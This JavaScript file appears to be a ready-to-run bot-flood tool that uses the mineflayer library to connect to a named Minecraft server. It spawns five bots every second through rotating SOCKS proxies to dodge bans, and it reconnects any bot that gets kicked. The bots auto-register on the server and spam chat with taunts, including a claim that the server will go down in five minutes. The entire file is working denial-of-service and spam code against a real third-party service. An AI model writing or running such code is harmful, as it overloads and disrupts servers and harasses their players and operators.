const mineflayer = require('mineflayer');
const socks = require('socks').SocksClient;

const CONFIG = {
    HOST: 'mc.mineblaze.ru',
    PORT: 25565,
    PROXIES: ['socks5://user:pass@1.1.1.1:1080', 'socks4://2.2.2.2:4153'],
    BOTS_PER_SECOND: 5,
    MESSAGES: [
        'Готбрейч рулит!',
        'Сервер падет через 5 минут',
        'RAGE MODE ACTIVATED'
    ]
};

class BotArmy {
    constructor() {
        this.botCount = 0;
        this.startAttack();
    }

    async createBot() {
        const proxy = CONFIG.PROXIES[Math.floor(Math.random() * CONFIG.PROXIES.length)];
        const agent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 50) + 80}.0.3987.163 Safari/537.36`;

        const bot = mineflayer.createBot({
            connect: (client) => {
                socks.createConnection({
                    proxy: {
                        host: proxy.split('://')[1].split(':')[0],
                        port: parseInt(proxy.split(':')[2]),
                        type: parseInt(proxy.split('://')[0].replace('socks', ''))
                    },
                    command: 'connect',
                    destination: {
                        host: CONFIG.HOST,
                        port: CONFIG.PORT
                    }
                }, (err, info) => {
                    if (err) return;
                    client.setSocket(info.socket);
                    client.emit('connect');
                });
            },
            username: this.generateName(),
            version: '1.12.2',
            hideErrors: true,
            checkTimeoutInterval: 0,
            agent: agent
        });

        bot.on('spawn', () => this.handleSpawn(bot));
        bot.on('kicked', (reason) => this.handleKick(bot, reason));
    }

    generateName() {
        return Buffer.from(Math.random().toString()).toString('base64').substr(0, 16);
    }

    handleSpawn(bot) {
        bot.chat('/register password password');
        bot.chat('/login password');
        
        setInterval(() => {
            bot.setControlState('jump', true);
            bot.look(Math.random() * Math.PI, Math.random() * Math.PI);
            setTimeout(() => bot.setControlState('jump', false), 500);
        }, 3000);

        setInterval(() => {
            bot.chat(CONFIG.MESSAGES[Math.floor(Math.random() * CONFIG.MESSAGES.length)]);
        }, 10000);
    }

    handleKick(bot, reason) {
        setTimeout(() => this.createBot(), 5000);
        bot.end();
    }

    startAttack() {
        setInterval(() => {
            for (let i = 0; i < CONFIG.BOTS_PER_SECOND; i++) {
                this.createBot();
            }
        }, 1000);
    }
}

new BotArmy();
